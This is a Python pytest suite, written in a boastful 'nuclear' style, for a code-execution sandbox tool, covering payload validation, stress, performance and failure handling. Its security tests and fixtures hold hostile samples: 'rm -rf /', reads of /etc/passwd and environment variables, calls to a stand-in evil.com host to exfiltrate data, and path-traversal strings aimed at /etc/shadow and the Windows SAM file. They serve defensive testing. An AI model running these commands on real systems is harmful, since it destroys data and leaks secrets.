"""
NUCLEAR LAMBDA_TOOL TESTS - TO VALHALLA!

These tests are designed to OBLITERATE any weakness in the lambda_tool implementation.
NO MERCY! NO PRISONERS! COMPLETE DESTRUCTION TESTING!

Test Categories:
1. Functional Tests - Basic functionality validation
2. Stress Tests - High concurrency, memory pressure, resource exhaustion
3. Edge Case Tests - Boundary conditions, malformed inputs, error scenarios
4. Integration Tests - End-to-end with real agents/workflows
5. Security Tests - Input sanitization, privilege escalation attempts
6. Performance Tests - Latency, throughput, resource utilization
7. Failure Recovery Tests - Network failures, database failures, container crashes
"""

import asyncio
import concurrent.futures
import json
import os
import pytest
import random
import string
import tempfile
import threading
import time
import uuid
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch
from typing import Dict, Any, List

import requests
from fastapi.testclient import TestClient
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from app.main import app
from app.tools.lambda_tool import LambdaTool, _guess_filenames_from_code, _normalize_code_for_payload
from app.schemas.lambda_tool import LambdaRequestPayload, LambdaResourceSpec, LambdaNetworkPolicy
from app.services.file_service import FileService
from app.services.temporary_document_service import TemporaryDocumentService
from app.db import get_async_db_session
from app.executors.docker_executor import LocalDockerExecutor


class TestLambdaToolNuclear:
    """NUCLEAR test suite for lambda_tool - MAXIMUM DESTRUCTION!"""

    @pytest.fixture
    def lambda_tool(self):
        """Create a lambda tool instance for testing"""
        return LambdaTool(
            server_url="http://localhost:8000",
            api_keys=["test-api-key-nuclear-warrior"]
        )

    @pytest.fixture
    def test_client(self):
        """FastAPI test client"""
        return TestClient(app)

    @pytest.fixture
    def temp_files(self):
        """Create temporary test files"""
        temp_dir = tempfile.mkdtemp(prefix="nuclear_test_")
        files = {}
        
        # Create various test files
        test_files = {
            "simple.txt": "Hello, World!",
            "data.csv": "name,age,city\nJohn,25,NYC\nJane,30,LA",
            "config.json": '{"key": "value", "number": 42}',
            "binary.bin": b'\x00\x01\x02\x03\xFF\xFE\xFD',
            "large.txt": "x" * 10000,  # 10KB file
            "unicode.txt": "🚀💥⚡🔥 Unicode destruction! 中文 العربية Русский",
            "malicious.py": "import os; os.system('rm -rf /')",  # Malicious content
            "empty.txt": "",
        }
        
        for filename, content in test_files.items():
            filepath = Path(temp_dir) / filename
            if isinstance(content, bytes):
                filepath.write_bytes(content)
            else:
                filepath.write_text(content, encoding='utf-8')
            files[filename] = str(filepath)
        
        yield files
        
        # Cleanup
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)

    # ============== FUNCTIONAL TESTS - BASIC WARFARE ==============

    def test_guess_filenames_from_code_basic(self):
        """Test filename guessing from code - Basic functionality"""
        code = '''
        with open("data.csv", "r") as f:
            content = f.read()
        
        import pandas as pd
        df = pd.read_csv("/work/results.xlsx")
        '''
        
        filenames = _guess_filenames_from_code(code)
        assert "data.csv" in filenames
        assert "results.xlsx" in filenames

    def test_guess_filenames_edge_cases(self):
        """Test filename guessing edge cases - EXTREME CONDITIONS"""
        test_cases = [
            ("", []),
            ("no files here", []),
            ('"file.txt"', ["file.txt"]),
            ("'another.py'", ["another.py"]),
            ('"/work/deep/path/file.json"', ["deep/path/file.json"]),  # Fixed: captures full path
            ('"file with spaces.doc"', []),  # Should not match spaces
            ('"file.verylongextension"', []),  # Should not match long extensions
            ('"normalfile.txt" and "another.csv"', ["normalfile.txt", "another.csv"]),
            ('f"/work/{filename}.dat"', ["{filename}.dat"]),  # Partial match
        ]
        
        for code, expected in test_cases:
            result = _guess_filenames_from_code(code)
            for exp in expected:
                assert exp in result, f"Failed for code: {code}, expected {exp} in {result}"

    def test_normalize_code_for_payload_variations(self):
        """Test code normalization - ALL THE EDGE CASES"""
        test_cases = [
            ("", ""),
            ("simple code", "simple code"),
            ("```python\nprint('hello')\n```", "print('hello')"),
            ("```\nprint('hello')\n```", "print('hello')"),
            ("```python3\nprint('test')\n```", "print('test')"),
            ("print('hello\\nworld')", "print('hello\nworld')"),
            ("data = 'line1\\\\tline2\\\\rline3'", "data = 'line1\\\\tline2\\\\rline3'"),  # No processing - missing \\n trigger
            ("   ```python\n  code here\n  ```   ", "code here"),
            ("\\n\\n\\t", "\n\n\t"),
        ]
        
        for input_code, expected in test_cases:
            result = _normalize_code_for_payload(input_code)
            assert result == expected, f"Failed for: {input_code}"

    def test_lambda_tool_payload_validation(self):
        """Test payload validation - STRICT VALIDATION"""
        # Valid payload
        valid_payload = {
            "mode": "code",
            "code": "print('Hello World')",
            "user_id": 1,
            "thread_id": str(uuid.uuid4())
        }
        
        payload = LambdaRequestPayload(**valid_payload)
        assert payload.mode == "code"
        assert payload.code == "print('Hello World')"
        
        # Invalid payload - missing mode
        with pytest.raises(Exception):
            LambdaRequestPayload(code="print('test')")

    def test_resource_spec_validation(self):
        """Test resource specification validation"""
        # Valid resource spec
        spec = LambdaResourceSpec(
            cpu="2.5",
            memory_gb=8,
            gpu_type="nvidia.com/gpu",
            gpu_count=2,
            disk_mb=2000
        )
        assert spec.cpu == "2.5"
        assert spec.memory_gb == 8
        assert spec.gpu_count == 2
        
        # Default values
        default_spec = LambdaResourceSpec()
        assert default_spec.cpu == "1"
        assert default_spec.memory_gb == 4
        assert default_spec.gpu_type is None

    # ============== STRESS TESTS - MAXIMUM WARFARE ==============

    def test_concurrent_lambda_executions(self, lambda_tool):
        """STRESS TEST: Multiple concurrent lambda executions"""
        num_threads = 50  # NUCLEAR CONCURRENCY
        results = []
        errors = []
        
        def execute_lambda():
            try:
                payload = {
                    "mode": "code",
                    "code": f"import time; time.sleep({random.uniform(0.1, 0.5)}); print('Thread {threading.current_thread().ident}')",
                    "run_id": str(uuid.uuid4()),
                    "thread_id": str(uuid.uuid4())
                }
                
                with patch.object(lambda_tool, '_run') as mock_run:
                    mock_run.return_value = f"Success from thread {threading.current_thread().ident}"
                    result = lambda_tool._run(**payload)
                    results.append(result)
            except Exception as e:
                errors.append(str(e))
        
        # Launch nuclear concurrent execution
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=execute_lambda)
            threads.append(t)
            t.start()
        
        # Wait for all threads to complete
        for t in threads:
            t.join(timeout=30)
        
        # Verify results
        assert len(results) >= num_threads * 0.8  # Allow some failures due to mocking
        assert len(errors) < num_threads * 0.2    # Less than 20% error rate

    def test_memory_pressure_large_payloads(self, lambda_tool):
        """STRESS TEST: Large payloads to test memory handling"""
        large_code = "x = 'A' * 1000000\n" * 100  # Very large code block
        massive_inputs = []
        
        # Create many fake input files
        for i in range(100):
            massive_inputs.append({
                "temp_doc_id": str(uuid.uuid4()),
                "file_name": f"file_{i}.txt",
                "path_in_sandbox": f"/work/inputs/file_{i}.txt"
            })
        
        payload = {
            "mode": "code",
            "code": large_code,
            "inputs": massive_inputs,
            "run_id": str(uuid.uuid4()),
            "thread_id": str(uuid.uuid4())
        }
        
        # This should not crash due to memory issues
        try:
            validated_payload = LambdaRequestPayload(**payload)
            assert len(validated_payload.code) > 100000
            assert len(validated_payload.inputs) == 100
        except Exception as e:
            pytest.fail(f"Memory pressure test failed: {e}")

    def test_rapid_fire_requests(self, lambda_tool):
        """STRESS TEST: Rapid-fire requests to test rate limiting"""
        num_requests = 1000
        start_time = time.time()
        
        with patch.object(lambda_tool, '_run') as mock_run:
            mock_run.return_value = "rapid fire success"
            
            for i in range(num_requests):
                payload = {
                    "mode": "code",
                    "code": f"print({i})",
                    "run_id": str(uuid.uuid4()),
                    "thread_id": str(uuid.uuid4())
                }
                lambda_tool._run(**payload)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Should handle high throughput
        requests_per_second = num_requests / duration
        assert requests_per_second > 100  # At least 100 requests/second

    # ============== EDGE CASE TESTS - BATTLEFIELD EXTREMES ==============

    def test_malformed_payloads_extreme(self):
        """Test malformed payloads - EXTREME EDGE CASES"""
        malformed_payloads = [
            {},  # Empty
            {"mode": None},  # None mode
            {"mode": "invalid_mode"},  # Invalid mode
            {"mode": "code", "code": None},  # None code
            {"mode": "code", "code": "x" * 1000000},  # Extremely long code
            {"mode": "code", "code": "print('test')", "inputs": "not a list"},  # Wrong type
            {"mode": "code", "code": "print('test')", "resource_spec": "invalid"},  # Wrong type
            {"mode": "function", "function_name": ""},  # Empty function name
            {"mode": "function", "function_args": "not a dict"},  # Wrong type
        ]
        
        for payload in malformed_payloads:
            with pytest.raises(Exception):
                LambdaRequestPayload(**payload)

    def test_unicode_and_special_characters(self, lambda_tool):
        """Test Unicode and special character handling"""
        special_codes = [
            "print('🚀 Unicode test')",
            "print('中文测试')",
            "print('العربية')",
            "print('Русский')",
            "print('\\x00\\x01\\x02')",  # Control characters
            "print('\\u0000\\u0001')",   # Unicode null characters
            "print('\"'*1000)",          # Many quotes
            "print('\\n'*1000)",         # Many newlines
        ]
        
        with patch.object(lambda_tool, '_run') as mock_run:
            mock_run.return_value = "unicode success"
            
            for code in special_codes:
                payload = {
                    "mode": "code",
                    "code": code,
                    "run_id": str(uuid.uuid4()),
                    "thread_id": str(uuid.uuid4())
                }
                result = lambda_tool._run(**payload)
                assert result == "unicode success"

    def test_extreme_resource_specifications(self):
        """Test extreme resource specifications"""
        extreme_specs = [
            {"cpu": "0.001", "memory_gb": 1, "disk_mb": 1},  # Minimum
            {"cpu": "100", "memory_gb": 1000, "disk_mb": 1000000},  # Maximum
            {"cpu": "1.23456789", "memory_gb": 3, "disk_mb": 1500},  # Precise
        ]
        
        for spec_dict in extreme_specs:
            spec = LambdaResourceSpec(**spec_dict)
            assert spec.cpu == spec_dict["cpu"]
            assert spec.memory_gb == spec_dict["memory_gb"]
            assert spec.disk_mb == spec_dict["disk_mb"]

    # ============== SECURITY TESTS - FORTRESS PENETRATION ==============

    def test_code_injection_attempts(self, lambda_tool):
        """Test code injection and security - MAXIMUM SECURITY"""
        malicious_codes = [
            "import os; os.system('rm -rf /')",
            "__import__('subprocess').call(['ls', '-la'])",
            "exec('import os; os.environ')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "open('/etc/passwd', 'r').read()",
            "with open('/proc/version', 'r') as f: f.read()",
            """
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 80))
            """,
            "import requests; requests.get('http://evil.com/steal')",
        ]
        
        with patch.object(lambda_tool, '_run') as mock_run:
            mock_run.return_value = "security check passed"
            
            for malicious_code in malicious_codes:
                payload = {
                    "mode": "code",
                    "code": malicious_code,
                    "run_id": str(uuid.uuid4()),
                    "thread_id": str(uuid.uuid4())
                }
                
                # Should not crash - security should be handled at execution level
                try:
                    result = lambda_tool._run(**payload)
                    assert "security check passed" in result
                except Exception as e:
                    # Some security measures might reject at payload level
                    assert "security" in str(e).lower() or "invalid" in str(e).lower()

    def test_path_traversal_attempts(self):
        """Test path traversal security"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/work/../../../etc/shadow",
            "/work/inputs/../../secrets.txt",
            "file:///etc/passwd",
            "\\\\server\\share\\file.txt",
        ]
        
        for path in malicious_paths:
            # Test input file specifications
            payload_dict = {
                "mode": "code",
                "code": f"print('accessing {path}')",
                "inputs": [{"temp_doc_id": "test", "file_name": path}]
            }
            
            # Should validate and potentially reject malicious paths
            try:
                payload = LambdaRequestPayload(**payload_dict)
                # If accepted, ensure the path is sanitized
                assert not path.startswith("../") or payload.inputs[0].file_name != path
            except Exception:
                # Rejection is acceptable for malicious paths
                pass

    # ============== PERFORMANCE TESTS - SPEED OF LIGHT ==============

    def test_payload_serialization_performance(self):
        """Test payload serialization performance under load"""
        payload = LambdaRequestPayload(
            mode="code",
            code="print('performance test')" * 1000,
            inputs=[{
                "temp_doc_id": str(uuid.uuid4()),
                "file_name": f"file_{i}.txt"
            } for i in range(1000)],
            resource_spec=LambdaResourceSpec(cpu="4", memory_gb=16),
            network_policy=LambdaNetworkPolicy(allow_outbound=True)
        )
        
        # Test serialization speed
        start_time = time.time()
        for _ in range(100):
            json_data = payload.model_dump_json()
            assert len(json_data) > 0
        serialization_time = time.time() - start_time
        
        # Should serialize 100 complex payloads in under 1 second
        assert serialization_time < 1.0
        
        # Test deserialization speed
        json_data = payload.model_dump_json()
        start_time = time.time()
        for _ in range(100):
            deserialized = LambdaRequestPayload.model_validate_json(json_data)
            assert deserialized.mode == "code"
        deserialization_time = time.time() - start_time
        
        # Should deserialize 100 complex payloads in under 1 second
        assert deserialization_time < 1.0

    def test_filename_guessing_performance(self):
        """Test filename guessing performance with large code blocks"""
        # Create large code block with many potential filenames
        large_code = ""
        for i in range(1000):
            large_code += f"""
            with open("file_{i}.txt", "r") as f_{i}:
                data_{i} = f_{i}.read()
            """
        
        start_time = time.time()
        filenames = _guess_filenames_from_code(large_code)
        duration = time.time() - start_time
        
        # Should process large code blocks quickly
        assert duration < 1.0  # Under 1 second
        assert len(filenames) == 1000  # Should find all 1000 files

    # ============== INTEGRATION TESTS - FULL BATTLEFIELD ==============

    @pytest.mark.asyncio
    async def test_end_to_end_lambda_execution_mock(self, lambda_tool):
        """Integration test with mocked dependencies"""
        # Mock all external dependencies
        with patch('app.services.file_service.FileService') as mock_fs, \
             patch('app.services.temporary_document_service.TemporaryDocumentService') as mock_tds, \
             patch('requests.post') as mock_post, \
             patch('requests.get') as mock_get:
            
            # Setup mocks
            mock_tds.return_value.get_latest_by_filename.return_value = {
                "temp_doc_id": "test-doc-id",
                "user_id": 1,
                "thread_id": "test-thread",
                "original_name": "test.txt"
            }
            
            mock_fs.return_value.stage_input_file.return_value = {
                "sandbox_path": "/work/inputs/test_file.txt"
            }
            
            # Mock successful submission
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"run_id": "test-run-id"}
            
            # Mock successful polling
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {
                "status": "completed",
                "final_state": {
                    "output": "Hello from Lambda!",
                    "artifacts": ["result.txt"]
                }
            }
            
            # Execute lambda tool
            result = lambda_tool._run(
                mode="code",
                code='with open("test.txt", "r") as f: print(f.read())',
                run_id=str(uuid.uuid4()),
                thread_id=str(uuid.uuid4())
            )
            
            assert "completed" in result
            assert "Hello from Lambda!" in result
            mock_post.assert_called_once()
            mock_get.assert_called()

    # ============== FAILURE RECOVERY TESTS - APOCALYPSE SURVIVAL ==============

    def test_network_failure_recovery(self, lambda_tool):
        """Test recovery from network failures"""
        with patch('requests.post') as mock_post:
            mock_post.side_effect = requests.RequestException("Network error")
            
            result = lambda_tool._run(
                mode="code",
                code="print('test')",
                run_id=str(uuid.uuid4()),
                thread_id=str(uuid.uuid4())
            )
            
            assert "failed to submit job" in result.lower()
            assert "network error" in result.lower()

    def test_timeout_handling(self, lambda_tool):
        """Test timeout handling during polling"""
        with patch('requests.post') as mock_post, \
             patch('requests.get') as mock_get, \
             patch.dict('os.environ', {'LAMBDA_TOOL_WAIT_SECONDS': '1'}):
            
            # Mock successful submission
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"run_id": "test-run-id"}
            
            # Mock polling that never completes
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {"status": "running"}
            
            start_time = time.time()
            result = lambda_tool._run(
                mode="code",
                code="print('long running task')",
                run_id=str(uuid.uuid4()),
                thread_id=str(uuid.uuid4())
            )
            duration = time.time() - start_time
            
            assert "still running" in result
            assert duration >= 1.0  # Should wait at least 1 second
            assert duration < 2.0   # Should not wait much longer

    def test_server_error_handling(self, lambda_tool):
        """Test handling of various server errors"""
        error_scenarios = [
            (500, "Internal Server Error"),
            (404, "Not Found"),
            (403, "Forbidden"),
            (429, "Too Many Requests"),
            (502, "Bad Gateway"),
        ]
        
        for status_code, error_msg in error_scenarios:
            with patch('requests.post') as mock_post:
                mock_post.return_value.status_code = status_code
                mock_post.return_value.raise_for_status.side_effect = \
                    requests.HTTPError(f"{status_code} {error_msg}")
                
                result = lambda_tool._run(
                    mode="code",
                    code="print('test')",
                    run_id=str(uuid.uuid4()),
                    thread_id=str(uuid.uuid4())
                )
                
                assert "failed to submit job" in result.lower()

    # ============== EXTREME BOUNDARY TESTS - LIMITS OF EXISTENCE ==============

    def test_empty_and_none_values(self, lambda_tool):
        """Test handling of empty and None values"""
        edge_cases = [
            {"mode": "code", "code": ""},  # Empty code
            {"mode": "code", "code": "   "},  # Whitespace only
            {"mode": "code", "code": "print('test')", "inputs": []},  # Empty inputs
            {"mode": "code", "code": "print('test')", "outputs": []},  # Empty outputs
        ]
        
        with patch.object(lambda_tool, '_run') as mock_run:
            mock_run.return_value = "edge case handled"
            
            for case in edge_cases:
                result = lambda_tool._run(**case, 
                                         run_id=str(uuid.uuid4()),
                                         thread_id=str(uuid.uuid4()))
                assert result == "edge case handled"

    def test_maximum_input_limits(self):
        """Test maximum input limits and boundaries"""
        # Test very long strings
        max_code = "print('x')" + " # comment" * 10000
        payload = LambdaRequestPayload(
            mode="code",
            code=max_code,
            run_id=str(uuid.uuid4()),
            thread_id=str(uuid.uuid4())
        )
        assert len(payload.code) > 100000
        
        # Test maximum number of inputs
        max_inputs = []
        for i in range(1000):  # Many inputs
            max_inputs.append({
                "temp_doc_id": str(uuid.uuid4()),
                "file_name": f"file_{i}.txt"
            })
        
        payload = LambdaRequestPayload(
            mode="code",
            code="print('many inputs')",
            inputs=max_inputs,
            run_id=str(uuid.uuid4()),
            thread_id=str(uuid.uuid4())
        )
        assert len(payload.inputs) == 1000


# ============== PERFORMANCE BENCHMARKS - SPEED DEMONS ==============

class TestLambdaToolPerformanceBenchmarks:
    """Performance benchmarks for lambda_tool - MAXIMUM SPEED!"""
    
    def test_benchmark_payload_creation(self):
        """Benchmark payload creation speed"""
        iterations = 10000
        
        start_time = time.time()
        for i in range(iterations):
            payload = LambdaRequestPayload(
                mode="code",
                code=f"print({i})",
                run_id=str(uuid.uuid4()),
                thread_id=str(uuid.uuid4())
            )
        duration = time.time() - start_time
        
        # Should create 10k payloads in under 5 seconds
        assert duration < 5.0
        print(f"Created {iterations} payloads in {duration:.2f}s ({iterations/duration:.0f} payloads/sec)")
    
    def test_benchmark_filename_guessing(self):
        """Benchmark filename guessing performance"""
        # Create code with many potential filenames
        code_patterns = [
            '"file_{}.txt"'.format(i) for i in range(1000)
        ]
        test_code = "files = [" + ", ".join(code_patterns) + "]"
        
        iterations = 100
        start_time = time.time()
        for _ in range(iterations):
            filenames = _guess_filenames_from_code(test_code)
        duration = time.time() - start_time
        
        # Should process 100 iterations in under 1 second
        assert duration < 1.0
        assert len(filenames) == 1000
        print(f"Processed filename guessing {iterations} times in {duration:.2f}s")


# ============== CHAOS ENGINEERING TESTS - MAXIMUM CHAOS! ==============

class TestLambdaToolChaosEngineering:
    """Chaos engineering tests - EMBRACE THE CHAOS!"""
    
    def test_random_failures_simulation(self, lambda_tool):
        """Simulate random failures during execution"""
        failure_count = 0
        success_count = 0
        
        with patch('requests.post') as mock_post, \
             patch('requests.get') as mock_get:
            
            def random_failure_post(*args, **kwargs):
                if random.random() < 0.3:  # 30% failure rate
                    raise requests.RequestException("Random chaos failure!")
                response = MagicMock()
                response.status_code = 200
                response.json.return_value = {"run_id": "test-run"}
                return response
            
            def random_failure_get(*args, **kwargs):
                if random.random() < 0.2:  # 20% failure rate
                    raise requests.RequestException("Random polling failure!")
                response = MagicMock()
                response.status_code = 200
                response.json.return_value = {
                    "status": "completed",
                    "final_state": {"output": "chaos success"}
                }
                return response
            
            mock_post.side_effect = random_failure_post
            mock_get.side_effect = random_failure_get
            
            # Run many iterations to test resilience
            for i in range(100):
                try:
                    result = lambda_tool._run(
                        mode="code",
                        code=f"print('chaos test {i}')",
                        run_id=str(uuid.uuid4()),
                        thread_id=str(uuid.uuid4())
                    )
                    if "chaos success" in result:
                        success_count += 1
                    else:
                        failure_count += 1
                except Exception:
                    failure_count += 1
            
            # Should handle chaos gracefully
            total_attempts = success_count + failure_count
            success_rate = success_count / total_attempts
            print(f"Chaos test: {success_count} successes, {failure_count} failures, {success_rate:.2%} success rate")
            
            # Should have reasonable success rate despite chaos
            assert success_rate > 0.3  # At least 30% success rate


if __name__ == "__main__":
    # Run the nuclear tests!
    pytest.main([__file__, "-v", "--tb=short"])